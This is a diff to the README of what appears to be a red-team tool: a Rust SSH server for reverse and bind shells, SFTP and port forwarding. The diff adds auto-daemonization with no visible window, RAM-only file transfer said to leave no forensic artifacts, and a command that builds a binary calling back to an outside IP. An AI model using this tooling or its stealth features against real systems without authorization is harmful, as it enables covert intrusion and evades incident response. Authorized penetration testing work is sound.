@@ -12,7 +12,7 @@
 
 **Statically-linked SSH server for penetration testing.**
 
-Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, and build-time configuration.
+Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary. Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) with TLS wrapping, SNI spoofing, build-time configuration, auto-daemonization, and in-memory SFTP.
 
 > **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.
 
@@ -103,6 +103,19 @@ All connection parameters baked at compile time. No runtime arguments needed on 
 # Produces a binary that auto-connects with no flags needed
 ```
 
+### Auto-Daemonize
+
+Neap automatically backgrounds itself on launch. Unix double-fork with full terminal detach. Windows detached process respawn. No visible window, no terminal output.
+
+### In-Memory SFTP
+
+RAM-only file storage with `--memfs`. Files never touch disk — zero forensic artifacts. All data lost on exit, by design.
+
+```bash
+neap --memfs -l -p 4444
+./build.sh reverse 10.10.14.5:443 --memfs
+```
+
 ---
 
 ## Architecture
@@ -132,6 +145,8 @@ Two-mode architecture: bind (server listens) or reverse (client dials home). Bot
 | SFTP | Full | Full |
 | Port Forwarding | Full | Full |
 | TLS Wrapping | Full | Full |
+| Auto-Daemonize | Full (double-fork) | Full (detached) |
+| In-Memory SFTP | Full | Full |
 | Static Binary | musl | MSVC |
 
 ---
